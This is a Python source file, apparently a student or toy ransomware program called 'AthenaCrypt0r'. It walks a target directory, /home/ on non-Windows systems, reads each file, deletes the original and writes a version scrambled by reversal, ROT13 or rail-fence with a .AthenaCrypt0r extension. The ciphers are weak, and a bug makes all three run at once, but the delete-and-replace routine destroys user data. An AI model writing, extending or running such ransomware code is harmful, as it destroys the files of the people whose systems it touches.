import getdirs
import os
import hashlib as h
import random as r
import time as t
#import urllib.request
import reverseCryptor as rc
import caeser as ca
import railfence as rail

def main():
    
    if os.name == "nt":
        path = "C:/TestFolder/"
    else:
        path = "/home/"

    files = getdirs.getdirs(path)

    # Randomly chooses an encryption algorithm and runs it.
    EncryptionAlgorithms = [reverseCryptor(files),caeser(files),RailfenceEncrypt(files,3)]
    r.choice(EncryptionAlgorithms)()


def reverseCryptor(files):
    outputfile = ".AthenaCrypt0r"
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = rc.reverse(contents)
        #print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

def RailfenceEncrypt(files, key):
    outputfile = ".AthenaCrypt0r"
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = rail.encryptRailFence(contents, key)
        #print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

def caeser(files):
    outputfile = ".AthenaCrypt0r"
    shift = 13
    for file in files:
        f = open(file, "r")
        contents = f.read()
        #print(contents)
        f.close()
        os.remove(file)
        encrypted = ca.caesar(contents, shift)
        print(encrypted)
        f1 = open(file+outputfile, "w")
        f1.write(encrypted)
        f1.close()

if __name__=="__main__":
    main()